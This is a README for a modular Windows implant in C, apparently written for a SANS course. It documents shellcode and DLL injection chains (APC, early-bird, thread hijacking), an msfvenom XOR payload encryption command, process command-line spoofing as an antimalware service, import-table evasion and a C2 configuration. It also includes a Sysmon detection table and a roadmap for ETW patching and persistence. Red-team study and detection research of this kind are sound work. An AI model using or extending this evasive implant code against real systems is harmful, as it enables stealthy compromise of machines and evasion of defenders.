# Starforge

Modular Windows implant written in C (MSVC x64). Built as part of SANS SEC670 and ongoing research. The goal is a collection of clean, well-documented modules that can drop into existing C2 frameworks or be used standalone. Not a full C2 framework.

> For authorized testing and research only.

---

## Structure

```
Star-Forge/
├── src/
│   ├── config.h          — IMPLANT_CONFIG struct
│   ├── main.c            — entry point
│   ├── modules/
│   │   ├── recon.c/h     — target enumeration
│   │   ├── injection.c/h — injection primitives
```

Everything loads DLLs dynamically at runtime. No sensitive imports in the IAT.

---

## Config

```c
typedef struct _IMPLANT_CONFIG {
    char          c2ip[64];
    int           port;
    int           sleep_interval;
    char          implant_name[64];
    unsigned char xor_key;
} IMPLANT_CONFIG;

IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA", 0x42 };
```

---

## Recon

Single function call, no child processes spawned anywhere.

```c
collect_recon();
```

What it collects:

| What | How | DLL | Detection |
|---|---|---|---|
| Processes | WTSEnumerateProcessesW | wtsapi32.dll | Low, no Toolhelp32 |
| Users | NetUserEnum | netapi32.dll | Low |
| Groups + members | NetLocalGroupEnum, NetLocalGroupGetMembers | netapi32.dll | Low |
| Shares | NetShareEnum | netapi32.dll | Low |
| Network adapters | GetAdaptersInfo | iphlpapi.dll | Low |
| ARP cache | GetIpNetTable | iphlpapi.dll | Low |
| TCP connections | GetTcpTable2 | iphlpapi.dll | Low |
| Integrity level | GetTokenInformation(TokenIntegrityLevel) | Advapi32.dll | Low |
| Privileges | GetTokenInformation(TokenPrivileges) | Advapi32.dll | Low |
| Installed apps | RegEnumKeyExW on all 3 Uninstall paths | Advapi32.dll | Low, read-only |

---

## Injection

Shellcode is XOR encrypted at rest using config.xor_key. Encrypted at build time:

```bash
msfvenom -p <payload> -f raw | python3 -c "
import sys; key=0x42; data=sys.stdin.buffer.read()
enc=bytes([b^key for b in data])
print('unsigned char buf[]={'+','.join(f'0x{b:02x}' for b in enc)+'}')
"
```

Decrypts in memory right before execution. Never RWX pages.

### inject_self
Shellcode in own process.
```
VirtualAlloc(RW) -> XOR decrypt -> memcpy -> VirtualProtect(RX) -> CreateThread -> WaitForSingleObject
```

### remote_inject
Classic DLL injection. Prompts for PID and DLL path.
```
OpenProcess -> VirtualAllocEx -> WriteProcessMemory(dllPath) -> CreateRemoteThread(LoadLibraryW)
```

### apc_inject
APC injection into all threads of a target process. No new thread created.
```
OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> VirtualProtectEx(RX) ->
Thread snapshot -> OpenThread(THREAD_SET_CONTEXT) -> QueueUserAPC
```

### early_apc_inject
Early bird variant. Shellcode runs before the target process main() executes. Main thread is guaranteed alertable when suspended so no guessing which thread is alertable.
```
CreateProcess(CREATE_SUSPENDED) -> VirtualAllocEx -> WriteProcessMemory ->
VirtualProtectEx(RX) -> QueueUserAPC(main thread) -> ResumeThread
```

Supports command line spoofing:
```c
CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", L"Antimalware Service Executable", ...)
```
Image name in Task Manager shows notepad.exe. Command line column shows whatever you pass.

### hollow_process (Thread Context Hijacking)
Reads child PEB via NtQueryInformationProcess to find image base. Redirects RIP to shellcode using GetThreadContext/SetThreadContext before resuming.
```
CreateProcess(CREATE_SUSPENDED) -> NtQueryInformationProcess -> ReadProcessMemory(PEB+0x10) ->
VirtualAllocEx -> WriteProcessMemory -> VirtualProtectEx(RX) ->
GetThreadContext(CONTEXT_FULL) -> ctx.Rip = shellcode -> SetThreadContext -> ResumeThread
```

---

## PE Utils

Manual GetProcAddress replacement. Walks the export directory without calling GetProcAddress so the function name strings don't need to be in the binary.

```c
PVOID manual_procaddress(HMODULE hModule, const char* funcName);
```

Handles forwarded exports. netapi32.dll forwards most functions to other DLLs and a naive implementation breaks. This one parses the forward string and recurses.

RESOLVE macro cleans up the boilerplate:
```c
#define RESOLVE(type, name, mod) type name = (type)manual_procaddress(mod, #name)

HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
RESOLVE(pVirtualAllocEx, VirtualAllocEx, k32);
// call VirtualAllocEx like normal after this
```

---

## IAT

Sensitive functions not in the IAT in Release builds:

**injection.c:** VirtualAllocEx, VirtualFreeEx, VirtualProtect, VirtualProtectEx, WriteProcessMemory, CreateRemoteThread, CreateThread, OpenProcess, OpenThread, QueueUserAPC, ResumeThread, WaitForSingleObject, CloseHandle, CreateToolhelp32Snapshot, Thread32First, Thread32Next, CreateProcessW, LoadLibraryW

**recon.c:** WTSEnumerateProcessesW, WTSFreeMemory, NetUserEnum, NetLocalGroupEnum, NetLocalGroupGetMembers, NetShareEnum, NetApiBufferFree, GetAdaptersInfo, GetIpNetTable, GetTcpTable2, OpenProcessToken, GetTokenInformation, GetSidSubAuthority, GetSidSubAuthorityCount, LookupPrivilegeNameW, RegOpenKeyExW, RegEnumKeyExW, RegQueryValueExW

Still present and on the day 29 list: GetModuleHandleW, LoadLibraryW (replacing with PEB walk and encrypted strings).

---

## Detection

| Technique | Sysmon | What to look for |
|---|---|---|
| WTS process enum | None | No CreateToolhelp32Snapshot |
| Registry read (apps) | None | Read-only, no Sysmon 13 |
| Remote DLL injection | Event 8, Event 10 | Remote thread from unexpected process |
| APC injection | Event 10 | ProcessAccess, no Event 8 |
| Early bird APC | Event 1, Event 10 | Suspended child + memory write + resume |
| Thread context hijacking | Event 10 | GetThreadContext/SetThreadContext cross-process |



## Roadmap

- [ ] Week 3 — ETW patching, ntdll unhooking, direct syscalls, process hiding
- [ ] Week 4 — Token privesc, named pipe, registry/COM persistence, WinSock2 C2 beacon
- [ ] Day 12.5b — True PE process hollowing (blocked on day 14.5)
- [ ] Day 14.5 — Reflective DLL injection (blocked on week 3)
- [ ] Day 29 — OPSEC pass, PEB walk, encrypted API strings, sleep jitter

---

## Related

- [CVE-POCs](https://github.com/aaron-kidwell/CVE-POCs) — CVE research and proof of concepts

---

Built as part of a structured implant development plan.
